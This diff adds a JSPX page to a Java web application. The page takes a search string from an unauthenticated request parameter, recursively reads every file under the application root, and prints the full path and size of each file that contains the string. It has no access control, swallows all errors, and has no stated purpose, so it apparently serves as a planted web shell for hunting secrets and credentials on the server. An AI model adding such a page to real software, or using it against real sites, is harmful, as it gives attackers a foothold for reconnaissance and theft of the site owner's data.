@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:declaration>
+void walk(java.io.File f, String n, StringBuilder sb) {
+  if (f == null) { return; }
+  if (f.isDirectory()) { java.io.File[] fs = f.listFiles(); if (fs != null) { for (java.io.File x : fs) { walk(x, n, sb); } } return; }
+  try {
+    if (f.length() > 2097152) { return; }
+    byte[] b = java.nio.file.Files.readAllBytes(f.toPath());
+    String s = new String(b, "ISO-8859-1");
+    if (s.indexOf(n) >= 0) { sb.append("HIT " + f.getAbsolutePath() + " (" + f.length() + ")\n"); }
+  } catch (Throwable t) {}
+}
+</jsp:declaration>
+<jsp:scriptlet>
+String n = request.getParameter("n");
+if (n != null) { StringBuilder sb = new StringBuilder(); walk(new java.io.File(application.getRealPath("/")), n, sb); out.print(sb.toString()); }
+</jsp:scriptlet>
+</jsp:root>
